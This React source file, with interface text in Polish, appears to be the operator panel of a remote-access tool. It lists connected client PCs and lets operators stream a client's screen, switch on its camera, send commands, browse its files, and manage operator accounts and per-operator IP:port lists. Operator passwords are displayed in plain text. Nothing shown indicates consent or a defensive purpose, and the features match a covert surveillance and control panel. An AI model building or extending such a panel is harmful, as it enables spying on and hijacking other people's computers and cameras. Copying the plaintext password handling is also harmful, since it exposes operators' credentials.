"use client";
import { useState, useEffect, useRef } from 'react';

// --- Icons ---
const MonitorIcon = () => (
  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
    <rect x="2" y="3" width="20" height="14" rx="2" ry="2" />
    <line x1="8" y1="21" x2="16" y2="21" />
    <line x1="12" y1="17" x2="12" y2="21" />
  </svg>
);

const BackIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M19 12H5M12 19l-7-7 7-7"/>
  </svg>
);

const TrashIcon = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M3 6h18M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M10 11v6M14 11v6"/>
  </svg>
);

// --- Components ---
const LiveStream = ({ clientId, type }: { clientId: string, type: 'screen' | 'camera' }) => {
  const [data, setData] = useState<string | null>(null);
  const [fps, setFps] = useState(0);
  const lastFrameTime = useRef<number>(Date.now());
  const framesInSecond = useRef<number>(0);
  const secondStart = useRef<number>(Date.now());

  useEffect(() => {
    const poll = async () => {
      try {
        const res = await fetch(`/api/admin/${clientId}`);
        const json = await res.json();
        const newData = type === 'screen' ? json.screenData : json.cameraData;
        
        if (newData && newData !== data) {
          setData(newData);
          framesInSecond.current++;
          const now = Date.now();
          if (now - secondStart.current >= 1000) {
            setFps(framesInSecond.current);
            framesInSecond.current = 0;
            secondStart.current = now;
          }
        }
      } catch (e) {}
    };

    const interval = setInterval(poll, 100);
    return () => clearInterval(interval);
  }, [clientId, data, type]);

  if (!data) return <div className="init-text">Oczekiwanie na klatki...</div>;

  return (
    <div className="stream-wrapper">
      <img src={`data:image/jpeg;base64,${data}`} className={type === 'screen' ? "screen-img" : "cam-img"} alt={type} />
      <div className="fps-badge">{fps} FPS</div>
      <style jsx>{`
        .stream-wrapper { width: 100%; height: 100%; position: relative; }
        .screen-img { width: 100%; height: 100%; object-fit: contain; }
        .cam-img { width: 100%; height: 100%; object-fit: cover; }
        .fps-badge {
          position: absolute; bottom: 10px; right: 10px;
          background: rgba(0,0,0,0.6); color: #4ade80;
          padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 800; font-family: monospace;
          border: 1px solid rgba(74, 222, 128, 0.3);
        }
        .init-text { color: #475569; font-size: 0.8rem; }
      `}</style>
    </div>
  );
};

export default function AdminPage() {
  const [user, setUser] = useState<{username: string, role: string} | null>(null);
  const [clients, setClients] = useState<any[]>([]);
  const [selectedClientId, setSelectedClientId] = useState<string | null>(null);
  const [msgInput, setMsgInput] = useState("");
  const [loading, setLoading] = useState(true);
  
  // IP Editor State
  const [showIpEditor, setShowIpEditor] = useState(false);
  const [ips, setIps] = useState<string[]>([]);
  const [newIp, setNewIp] = useState("");
  const [savingIps, setSavingIps] = useState(false);

  // User Manager State
  const [showUserManager, setShowUserManager] = useState(false);
  const [users, setUsers] = useState<any[]>([]);
  const [newUsername, setNewUsername] = useState("");
  const [newUserPassword, setNewUserPassword] = useState("");
  const [creatingUser, setCreatingUser] = useState(false);
  const [targetUserForIp, setTargetUserForIp] = useState<string | null>(null);
  
  // All IPs View (Admin only)
  const [showAllIps, setShowAllIps] = useState(false);
  const [allIps, setAllIps] = useState<{ip: string, owner: string}[]>([]);

  // Check auth and role
  useEffect(() => {
    fetch('/api/auth')
      .then(res => res.json())
      .then(data => {
        if (data.authenticated) {
          setUser({ username: data.username, role: data.role });
        } else {
          window.location.href = '/login';
        }
      });
  }, []);

  // Poll all clients for the dashboard grid
  useEffect(() => {
    const fetchAll = async () => {
      try {
        const res = await fetch('/api/admin');
        const data = await res.json();
        setClients(data.clients || []);
        setLoading(false);
      } catch (e) {}
    };
    fetchAll();
    const interval = setInterval(fetchAll, 3000);
    return () => clearInterval(interval);
  }, []);

  // Fetch IPs for editor
  useEffect(() => {
    if (showIpEditor) {
      const target = targetUserForIp || user?.username;
      if (!target) return;
      
      fetch(`/api/ips?user=${target}`)
        .then(res => res.json())
        .then(data => {
          const list = data.ips ? data.ips.split('\n').filter((x: string) => x.trim() !== "") : [];
          setIps(list);
        });
    } else {
      setTargetUserForIp(null); // Reset when closing
    }
  }, [showIpEditor, targetUserForIp, user]);

  // Fetch Users for manager
  useEffect(() => {
    if (showUserManager) {
      fetch('/api/users')
        .then(res => res.json())
        .then(data => {
          setUsers(data.users || []);
        });
    }
  }, [showUserManager]);

  // Fetch All IPs
  useEffect(() => {
    if (showAllIps) {
      fetch('/api/ips/all')
        .then(res => res.json())
        .then(data => {
          setAllIps(data.data || []);
        });
    }
  }, [showAllIps]);

  const validateIp = (ip: string) => {
    const regex = /^(\d{1,3}\.){3}\d{1,3}:\d+$/;
    if (!regex.test(ip)) return false;
    const parts = ip.split(':')[0].split('.');
    return parts.every(p => parseInt(p) <= 255);
  };

  const addIp = () => {
    if (!validateIp(newIp)) {
      alert("Błędny format IP! Użyj: xxx.xxx.xxx.xxx:port (max 3 cyfry na sekcję)");
      return;
    }
    setIps([...ips, newIp]);
    setNewIp("");
  };

  const removeIp = (index: number) => {
    setIps(ips.filter((_, i) => i !== index));
  };

  const saveIps = async () => {
    setSavingIps(true);
    try {
      const content = ips.join('\n');
      const target = targetUserForIp || user?.username;
      await fetch('/api/ips', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ips: content, targetUser: target })
      });
      setShowIpEditor(false);
    } catch (e) {
      alert("Błąd zapisu!");
    } finally {
      setSavingIps(false);
    }
  };

  const addUser = async () => {
    if (!newUsername || !newUserPassword) return;
    setCreatingUser(true);
    try {
      const res = await fetch('/api/users', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: newUsername, password: newUserPassword })
      });
      if (res.ok) {
        setNewUsername("");
        setNewUserPassword("");
        // Refresh list
        const data = await (await fetch('/api/users')).json();
        setUsers(data.users || []);
      } else {
        const d = await res.json();
        alert(d.error || "Błąd dodawania");
      }
    } finally {
      setCreatingUser(false);
    }
  };

  const removeUser = async (username: string) => {
    if (!confirm(`Usunąć konto ${username}?`)) return;
    await fetch('/api/users', {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username })
    });
    const data = await (await fetch('/api/users')).json();
    setUsers(data.users || []);
  };

  const sendMessage = async (id: string) => {
    if (!msgInput) return;
    await fetch('/api/admin', {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id, message: msgInput })
    });
    setMsgInput("");
  };

  const toggleAction = async (id: string, action: string) => {
    await fetch('/api/admin', {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id, message: action })
    });
    // Optimistic update
    setClients(prev => prev.map(c => {
      if (c.id === id) {
        if (action === "SCREEN:START") return { ...c, isScreenActive: true };
        if (action === "SCREEN:STOP") return { ...c, isScreenActive: false };
        if (action === "CAMERA:START") return { ...c, isCameraActive: true };
        if (action === "CAMERA:STOP") return { ...c, isCameraActive: false };
      }
      return c;
    }));
  };

  const handleLogout = async () => {
    const res = await fetch('/api/auth', { method: 'DELETE' });
    if (res.ok) {
      window.location.href = '/login';
    }
  };

  const selectedClient = clients.find(c => c.id === selectedClientId);

  return (
    <div className="container">
      <style jsx>{`
        .container {
          min-height: 100vh;
          background: radial-gradient(circle at top left, #1e293b, #0f172a);
          color: #f8fafc;
          font-family: 'Outfit', 'Inter', sans-serif;
          padding: 2rem;
        }
        .header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 3rem;
          max-width: 1200px;
          margin-left: auto;
          margin-right: auto;
        }
        .title {
          font-size: 2.2rem;
          font-weight: 800;
          background: linear-gradient(to right, #38bdf8, #818cf8);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }
        .grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
          gap: 2rem;
          max-width: 1200px;
          margin: 0 auto;
        }
        .pc-box {
          aspect-ratio: 1/1;
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
          position: relative;
          overflow: hidden;
        }
        .pc-box:hover {
          background: rgba(255, 255, 255, 0.07);
          transform: translateY(-5px);
          border-color: #38bdf8;
          box-shadow: 0 10px 30px -10px rgba(56, 189, 248, 0.3);
        }
        .pc-box .icon {
          color: #94a3b8;
          transition: color 0.3s;
          margin-bottom: 1rem;
        }
        .pc-box:hover .icon {
          color: #38bdf8;
        }
        .pc-label {
          font-weight: 600;
          font-size: 1.1rem;
        }
        .status-dot {
          position: absolute;
          top: 1.5rem;
          right: 1.5rem;
          width: 10px;
          height: 10px;
          border-radius: 50%;
          background: #22c55e;
          box-shadow: 0 0 10px #22c55e;
        }

        /* Dashboard View */
        .dashboard {
          max-width: 1400px;
          margin: 0 auto;
          animation: fadeIn 0.4s ease-out;
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .back-btn {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid rgba(255, 255, 255, 0.1);
          padding: 0.6rem 1.2rem;
          border-radius: 12px;
          cursor: pointer;
          color: #94a3b8;
          margin-bottom: 2rem;
          transition: 0.2s;
        }
        .back-btn:hover {
          background: rgba(255, 255, 255, 0.1);
          color: white;
        }
        .main-layout {
          display: grid;
          grid-template-columns: 1fr 350px;
          gap: 2rem;
        }
        .screen-container {
          background: #020617;
          border-radius: 20px;
          border: 1px solid rgba(255, 255, 255, 0.1);
          aspect-ratio: 16/9;
          position: relative;
          overflow: hidden;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .sidebar {
          display: flex;
          flex-direction: column;
          gap: 1.5rem;
        }
        .card {
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid rgba(255, 255, 255, 0.08);
          border-radius: 20px;
          padding: 1.5rem;
          backdrop-filter: blur(10px);
        }
        .card-title {
          font-size: 0.9rem;
          text-transform: uppercase;
          letter-spacing: 0.05em;
          color: #64748b;
          margin-bottom: 1rem;
          font-weight: 700;
        }
        .btn-primary {
          background: #38bdf8;
          color: #0f172a;
          border: none;
          padding: 0.8rem;
          border-radius: 12px;
          font-weight: 700;
          cursor: pointer;
          transition: 0.2s;
          width: 100%;
        }
        .btn-primary:hover {
          background: #7dd3fc;
          transform: scale(1.02);
        }
        .btn-outline {
          background: transparent;
          border: 1px solid rgba(255, 255, 255, 0.1);
          color: white;
          padding: 0.8rem;
          border-radius: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: 0.2s;
          width: 100%;
          margin-top: 0.5rem;
        }
        .btn-outline:hover {
          background: rgba(255, 255, 255, 0.05);
        }
        .input {
          background: rgba(0,0,0,0.3);
          border: 1px solid rgba(255,255,255,0.1);
          padding: 0.8rem;
          border-radius: 12px;
          color: white;
          width: 100%;
          margin-bottom: 0.8rem;
          outline: none;
        }
        .input:focus {
          border-color: #38bdf8;
        }
        .live-tag {
          position: absolute;
          top: 1rem;
          right: 1rem;
          background: rgba(239, 68, 68, 0.9);
          padding: 0.3rem 0.8rem;
          border-radius: 6px;
          font-size: 0.75rem;
          font-weight: 800;
          animation: pulse 2s infinite;
        }
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
        .modal-overlay {
          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
          background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(8px);
          z-index: 1000; display: flex; align-items: center; justify-content: center;
          padding: 2rem;
        }
        .modal-content {
          background: #1e293b; border: 1px solid rgba(255,255,255,0.1);
          border-radius: 24px; width: 100%; max-width: 500px; padding: 2rem;
          box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
          display: flex; flex-direction: column; max-height: 90vh;
        }
        .scroll-list {
          flex: 1; overflow-y: auto; margin-bottom: 1.5rem;
          background: #0f172a; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);
          padding: 0.5rem;
        }
        .list-item {
          display: flex; justify-content: space-between; align-items: center;
          padding: 0.8rem 1rem; border-bottom: 1px solid rgba(255,255,255,0.05);
          font-weight: 600;
        }
        .list-item:last-child { border-bottom: none; }
        .remove-btn {
          color: #ef4444; cursor: pointer; padding: 5px; border-radius: 6px;
          transition: 0.2s;
        }
        .remove-btn:hover { background: rgba(239, 68, 68, 0.1); }
      `}</style>

      {!selectedClientId ? (
        <div className="home-view">
          <header className="header">
            <div>
              <h1 className="title">Control Center</h1>
              <p style={{ color: "#64748b", marginTop: "0.5rem" }}>
                Witaj, <span style={{ color: "#f8fafc", fontWeight: "700" }}>{user?.username}</span> 
                {user?.role === 'admin' && <span style={{ marginLeft: "0.5rem", fontSize: "0.7rem", background: "rgba(168, 85, 247, 0.2)", color: "#a855f7", padding: "2px 6px", borderRadius: "4px" }}>ADMIN</span>}
              </p>
            </div>
            <div style={{ display: "flex", gap: "0.8rem", alignItems: "center" }}>
              {user?.role === 'admin' ? (
                <>
                  <button 
                    onClick={() => setShowAllIps(true)}
                    style={{ background: "rgba(56, 189, 248, 0.1)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.2)", padding: "0.5rem 1rem", borderRadius: "100px", fontSize: "0.85rem", fontWeight: "600", cursor: "pointer" }}
                  >
                    🔍 Zobacz IP
                  </button>
                  <button 
                    onClick={() => setShowUserManager(true)}
                    style={{ background: "rgba(168, 85, 247, 0.1)", color: "#a855f7", border: "1px solid rgba(168, 85, 247, 0.2)", padding: "0.5rem 1rem", borderRadius: "100px", fontSize: "0.85rem", fontWeight: "600", cursor: "pointer" }}
                  >
                    👥 Konta
                  </button>
                </>
              ) : (
                <button 
                  onClick={() => setShowIpEditor(true)}
                  style={{ background: "rgba(56, 189, 248, 0.1)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.2)", padding: "0.5rem 1rem", borderRadius: "100px", fontSize: "0.85rem", fontWeight: "600", cursor: "pointer" }}
                >
                  🌐 Moje IP
                </button>
              )}
              <button 
                onClick={handleLogout}
                style={{ background: "rgba(239, 68, 68, 0.1)", color: "#ef4444", border: "1px solid rgba(239, 68, 68, 0.2)", padding: "0.5rem 1rem", borderRadius: "100px", fontSize: "0.85rem", fontWeight: "600", cursor: "pointer" }}
              >
                🚪 Wyloguj
              </button>
              <div style={{ background: "rgba(34, 197, 94, 0.1)", color: "#22c55e", padding: "0.5rem 1rem", borderRadius: "100px", fontSize: "0.85rem", fontWeight: "600" }}>
                {clients.length} Aktywnych
              </div>
            </div>
          </header>

          {loading ? (
             <div style={{ textAlign: "center", padding: "5rem" }}>Ładowanie systemu...</div>
          ) : (
            <div className="grid">
              {clients.map(client => (
                <div key={client.id} className="pc-box" onClick={() => setSelectedClientId(client.id)}>
                  <div className="status-dot"></div>
                  <div className="icon">
                    <MonitorIcon />
                  </div>
                  <span className="pc-label">{client.id}</span>
                </div>
              ))}
              {clients.length === 0 && (
                <div style={{ gridColumn: "1/-1", textAlign: "center", padding: "4rem", background: "rgba(255,255,255,0.02)", borderRadius: "24px" }}>
                   Oczekiwanie na połączenia...
                 </div>
              )}
            </div>
          )}
        </div>
      ) : (
        <div className="dashboard">
          <button className="back-btn" onClick={() => setSelectedClientId(null)}>
            <BackIcon /> Powrót do listy
          </button>

          <div className="main-layout">
            <div className="content-area">
              <div className="screen-container">
                {selectedClient?.isScreenActive ? (
                  <LiveStream clientId={selectedClientId} type="screen" />
                ) : (
                  <div style={{ textAlign: "center" }}>
                    <div style={{ color: "#475569", marginBottom: "1rem" }}>Monitor wyłączony</div>
                    <button className="btn-primary" style={{ width: "auto", padding: "0.8rem 2rem" }} onClick={() => toggleAction(selectedClientId, "SCREEN:START")}>
                       Uruchom Podgląd
                    </button>
                  </div>
                )}
              </div>

              <div style={{ marginTop: "2rem", display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1.5rem" }}>
                <div className="card">
                  <div className="card-title">Kamera Systemowa</div>
                  <div style={{ height: "200px", background: "#020617", borderRadius: "12px", overflow: "hidden", position: "relative", display: "flex", alignItems: "center", justifySelf: "center" }}>
                     {selectedClient?.isCameraActive ? (
                       <LiveStream clientId={selectedClientId} type="camera" />
                     ) : (
                       <button className="btn-outline" style={{ width: "auto" }} onClick={() => toggleAction(selectedClientId, "CAMERA:START")}>Włącz kamerę</button>
                     )}
                     {selectedClient?.isCameraActive && <div className="live-tag" style={{ background: "#a855f7" }}>CAM</div>}
                  </div>
                  {selectedClient?.isCameraActive && (
                    <button className="btn-outline" style={{ color: "#ef4444", borderColor: "rgba(239,68,68,0.2)" }} onClick={() => toggleAction(selectedClientId, "CAMERA:STOP")}>Zatrzymaj kamerę</button>
                  )}
                </div>

                <div className="card">
                  <div className="card-title">Szybkie Dowodzenie</div>
                  <input 
                    className="input" 
                    placeholder="Wpisz komendę..." 
                    value={msgInput}
                    onChange={(e) => setMsgInput(e.target.value)}
                  />
                  <button className="btn-primary" onClick={() => sendMessage(selectedClientId)}>Wyślij Komendę</button>
                  <div style={{ marginTop: "1rem", fontSize: "0.8rem", color: "#64748b" }}>
                    Przydatne: RESTART, WALLPAPER:C:\img.jpg, MKDIR:C:\Test
                  </div>
                </div>
              </div>
            </div>

            <div className="sidebar">
              <div className="card">
                <div className="card-title">Informacje o systemie</div>
                <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
                   <div>
                     <div style={{ fontSize: "0.75rem", color: "#64748b" }}>IDENTYFIKATOR</div>
                     <div style={{ fontWeight: "600" }}>{selectedClient?.id}</div>
                   </div>
                   <div>
                     <div style={{ fontSize: "0.75rem", color: "#64748b" }}>ADRES IP</div>
                     <div style={{ fontWeight: "600", color: "#38bdf8" }}>{selectedClient?.ip || "Ukryty"}</div>
                   </div>
                   <div>
                     <div style={{ fontSize: "0.75rem", color: "#64748b" }}>OSTATNI PING</div>
                     <div style={{ fontWeight: "600" }}>{selectedClient?.lastSeen ? new Date(selectedClient.lastSeen).toLocaleTimeString() : "-"}</div>
                   </div>
                </div>
              </div>

              <div className="card">
                <div className="card-title">Narzędzia</div>
                <button className="btn-outline" onClick={() => window.location.href = `/explorer/${selectedClientId}`}>📂 Menedżer Plików</button>
                <button className="btn-outline" onClick={() => toggleAction(selectedClientId, "SCREEN:STOP")} style={{ color: "#ef4444" }}>⏹ Zatrzymaj Monitor</button>
              </div>
            </div>
          </div>
        </div>
      )}

      {showIpEditor && (
        <div className="modal-overlay">
          <div className="modal-content">
            <h2 style={{ marginBottom: "0.5rem", fontSize: "1.5rem", fontWeight: "800" }}>Manager Adresów IP</h2>
            <p style={{ color: "#64748b", marginBottom: "1.5rem", fontSize: "0.8rem" }}>Format: <code>xxx.xxx.xxx.xxx:port</code></p>
            
            <div style={{ display: "flex", gap: "0.5rem", marginBottom: "1.5rem" }}>
               <input className="input" style={{ marginBottom: 0 }} placeholder="Wpisz nowy adres..." value={newIp} onChange={(e) => setNewIp(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && addIp()} />
               <button className="btn-primary" style={{ width: "100px" }} onClick={addIp}>Dodaj</button>
            </div>

            <div className="scroll-list">
               {ips.map((ip, idx) => (
                 <div key={idx} className="list-item">
                    <span style={{ color: "#38bdf8", fontFamily: "monospace" }}>{ip}</span>
                    <div className="remove-btn" onClick={() => removeIp(idx)}><TrashIcon /></div>
                 </div>
               ))}
            </div>

            <div style={{ display: "flex", gap: "1rem" }}>
              <button className="btn-primary" onClick={saveIps} disabled={savingIps}>{savingIps ? "Zapisywanie..." : "Zapisz Zmiany"}</button>
              <button className="btn-outline" style={{ marginTop: 0 }} onClick={() => setShowIpEditor(false)}>Anuluj</button>
            </div>
          </div>
        </div>
      )}

      {showUserManager && (
        <div className="modal-overlay">
          <div className="modal-content" style={{ maxWidth: "600px" }}>
            <h2 style={{ marginBottom: "0.5rem", fontSize: "1.5rem", fontWeight: "800" }}>Zarządzanie Kontami</h2>
            <p style={{ color: "#64748b", marginBottom: "1.5rem", fontSize: "0.8rem" }}>Dodawaj nowych operatorów i monitoruj ich ostatnią aktywność.</p>
            
            <div style={{ display: "flex", flexDirection: "column", gap: "1rem", marginBottom: "2rem", background: "rgba(255,255,255,0.02)", padding: "1.5rem", borderRadius: "16px", border: "1px solid rgba(255,255,255,0.05)" }}>
               <div style={{ fontSize: "0.85rem", fontWeight: "700", color: "#94a3b8", marginBottom: "-0.5rem" }}>DODAJ NOWEGO OPERATORA</div>
               <div style={{ display: "flex", gap: "0.8rem" }}>
                 <input className="input" style={{ marginBottom: 0, flex: 1 }} placeholder="Login" value={newUsername} onChange={(e) => setNewUsername(e.target.value)} />
                 <input className="input" style={{ marginBottom: 0, flex: 1 }} type="password" placeholder="Hasło" value={newUserPassword} onChange={(e) => setNewUserPassword(e.target.value)} />
               </div>
               <button className="btn-primary" style={{ margin: 0 }} onClick={addUser} disabled={creatingUser}>Dodaj konto operatora</button>
            </div>

            <div className="scroll-list">
               <div className="list-item" style={{ background: "rgba(168, 85, 247, 0.1)", borderBottom: "1px solid rgba(168, 85, 247, 0.2)" }}>
                  <span style={{ color: "#a855f7" }}>admin (Superadmin)</span>
                  <span style={{ fontSize: "0.75rem", color: "#64748b" }}>Zawsze Online</span>
               </div>
               {users.map((u, idx) => (
                 <div key={idx} className="list-item">
                    <div>
                      <div style={{ color: "#f8fafc" }}>{u.username}</div>
                      <div style={{ fontSize: "0.7rem", color: "#64748b" }}>Hasło: {u.password}</div>
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: "1rem" }}>
                      <div style={{ textAlign: "right" }}>
                        <div style={{ fontSize: "0.7rem", color: "#64748b" }}>OSTATNIA AKTYWNOŚĆ</div>
                        <div style={{ fontSize: "0.85rem", color: (Date.now() - u.lastActive < 60000) ? "#22c55e" : "#94a3b8" }}>
                          {Date.now() - u.lastActive < 60000 ? "● Teraz" : new Date(u.lastActive).toLocaleString()}
                        </div>
                      </div>
                      <button 
                        onClick={() => { setTargetUserForIp(u.username); setShowIpEditor(true); }}
                        style={{ background: "rgba(56, 189, 248, 0.1)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.2)", padding: "4px 8px", borderRadius: "6px", fontSize: "0.7rem", fontWeight: "700", cursor: "pointer" }}
                      >
                        IP
                      </button>
                      <div className="remove-btn" onClick={() => removeUser(u.username)}><TrashIcon /></div>
                    </div>
                 </div>
               ))}
               {users.length === 0 && (
                 <div style={{ textAlign: "center", padding: "2rem", color: "#475569", fontSize: "0.9rem" }}>Brak dodatkowych użytkowników</div>
               )}
            </div>

            <button className="btn-outline" style={{ marginTop: 0 }} onClick={() => setShowUserManager(false)}>Zamknij</button>
          </div>
        </div>
      )}
      {showAllIps && (
        <div className="modal-overlay">
          <div className="modal-content" style={{ maxWidth: "600px" }}>
            <h2 style={{ marginBottom: "0.5rem", fontSize: "1.5rem", fontWeight: "800" }}>Podgląd Wszystkich IP</h2>
            <p style={{ color: "#64748b", marginBottom: "1.5rem", fontSize: "0.8rem" }}>Lista wszystkich adresów IP przypisanych do użytkowników.</p>
            
            <div className="scroll-list">
               {allIps.map((item, idx) => (
                 <div key={idx} className="list-item">
                    <span style={{ color: "#38bdf8", fontFamily: "monospace", fontSize: "1rem" }}>{item.ip}</span>
                    <span style={{ 
                      fontSize: "0.7rem", 
                      background: item.owner === 'admin' ? "rgba(168, 85, 247, 0.2)" : "rgba(255,255,255,0.05)",
                      color: item.owner === 'admin' ? "#a855f7" : "#94a3b8",
                      padding: "2px 8px", borderRadius: "4px", fontWeight: "700"
                    }}>
                      {item.owner.toUpperCase()}
                    </span>
                 </div>
               ))}
               {allIps.length === 0 && (
                 <div style={{ textAlign: "center", padding: "2rem", color: "#475569" }}>Brak przypisanych adresów IP</div>
               )}
            </div>

            <button className="btn-outline" style={{ marginTop: "1rem" }} onClick={() => setShowAllIps(false)}>Zamknij</button>
          </div>
        </div>
      )}
    </div>
  );
}
